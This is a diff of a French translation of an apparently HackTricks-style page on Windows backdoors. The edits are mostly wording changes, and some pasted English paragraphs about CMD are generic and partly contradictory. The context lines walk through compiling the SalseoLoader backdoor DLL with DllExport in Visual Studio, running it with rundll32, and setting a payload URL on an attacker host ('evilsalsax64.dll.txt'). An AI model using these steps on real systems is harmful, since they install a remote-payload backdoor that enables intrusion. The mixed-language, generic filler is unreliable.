@@ -45,7 +45,7 @@ Les backdoors peuvent être installés de différentes manières, notamment par 
 
 Il existe plusieurs outils et techniques pour détecter et supprimer les backdoors sur les systèmes Windows. Certains outils populaires incluent des scanners de vulnérabilités, des antivirus et des pare-feu. Il est également important de maintenir votre système à jour avec les derniers correctifs de sécurité pour réduire les risques d'exploitation de vulnérabilités connues.
 
-Pour prévenir les backdoors, il est essentiel de suivre de bonnes pratiques de sécurité, telles que l'utilisation de mots de passe forts, l'installation de logiciels provenant de sources fiables, la mise en place de pare-feu et la sensibilisation à la sécurité informatique. En outre, il est recommandé de réaliser régulièrement des audits de sécurité pour détecter et corriger les vulnérabilités potentielles.
+Pour prévenir les backdoors, il est essentiel de suivre de bonnes pratiques de sécurité, telles que l'utilisation de mots de passe forts, l'installation de logiciels provenant de sources fiables, la mise en place de pare-feu et la sensibilisation à la sécurité informatique. En outre, il est recommandé de réaliser régulièrement des audits de sécurité pour détecter et corriger les éventuelles vulnérabilités.
 
 En conclusion, les backdoors sont une menace sérieuse pour la sécurité des systèmes Windows. Il est essentiel de prendre des mesures pour les détecter, les prévenir et les éliminer afin de protéger vos informations sensibles et votre système contre les attaques.
 ```
@@ -101,7 +101,7 @@ Ouvrez le projet SalseoLoader à l'aide de Visual Studio.
 
 ### Ajoutez avant la fonction principale: \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### Installez DllExport pour ce projet
 
@@ -109,7 +109,7 @@ Ouvrez le projet SalseoLoader à l'aide de Visual Studio.
 
 ![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-#### **Recherchez le package DllExport (utilisez l'onglet Parcourir) et appuyez sur Installer (et acceptez la fenêtre contextuelle)**
+#### **Recherchez le package DllExport (en utilisant l'onglet Parcourir) et appuyez sur Installer (et acceptez la fenêtre contextuelle)**
 
 ![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png>)
 
@@ -117,7 +117,7 @@ Dans le dossier de votre projet, les fichiers suivants sont apparus : **DllExpor
 
 ### **Désinstallez DllExport**
 
-Appuyez sur **Désinstaller** (oui, c'est bizarre mais faites-moi confiance, c'est nécessaire)
+Appuyez sur **Désinstaller** (oui, c'est étrange mais faites-moi confiance, c'est nécessaire)
 
 ![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)
 
@@ -143,7 +143,7 @@ Sélectionnez **Type de sortie = Bibliothèque de classes** (Projet --> Proprié
 
 ![](<../.gitbook/assets/image (10) (1).png>)
 
-Sélectionnez **plateforme x64** (Projet --> Propriétés de SalseoLoader --> Général --> Cible de la plateforme = x64)
+Sélectionnez la **plateforme x64** (Projet --> Propriétés de SalseoLoader --> Général --> Cible de la plateforme = x64)
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
@@ -174,13 +174,13 @@ rundll32.exe SalseoLoader.dll,main
 ```
 ### CMD
 
-CMD (Command Prompt) is a command-line interpreter for Windows operating systems. It provides a way to interact with the operating system by executing commands. CMD can be used to perform various tasks, such as navigating through directories, running programs, and managing files and processes.
+CMD (Command Prompt) is a command-line interpreter for Windows operating systems. It provides a text-based interface for executing commands and performing various tasks. CMD can be used to navigate the file system, run programs, manage processes, and perform administrative tasks.
 
-CMD is often used by hackers as a backdoor to gain unauthorized access to a system. By exploiting vulnerabilities or using social engineering techniques, hackers can execute malicious commands through CMD to compromise the security of a target system.
+CMD is a powerful tool for hackers as it allows them to execute commands and scripts on a target system. By gaining access to CMD, hackers can exploit vulnerabilities, escalate privileges, and gain control over the target system.
 
-To protect against CMD backdoors, it is important to keep your system up to date with the latest security patches and to use strong passwords. Additionally, monitoring network traffic and implementing intrusion detection systems can help detect and prevent unauthorized access through CMD.
+To access CMD, simply open the Command Prompt application on a Windows machine. Once opened, you can start executing commands by typing them directly into the CMD window.
 
-Remember, CMD can be a powerful tool when used responsibly, but in the wrong hands, it can be used to cause significant harm. Stay vigilant and take necessary precautions to protect your system from CMD-based attacks.
+It is important to note that CMD should only be used for legitimate purposes, such as system administration or troubleshooting. Using CMD for malicious activities is illegal and unethical. Always ensure that you have proper authorization before using CMD on a target system.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
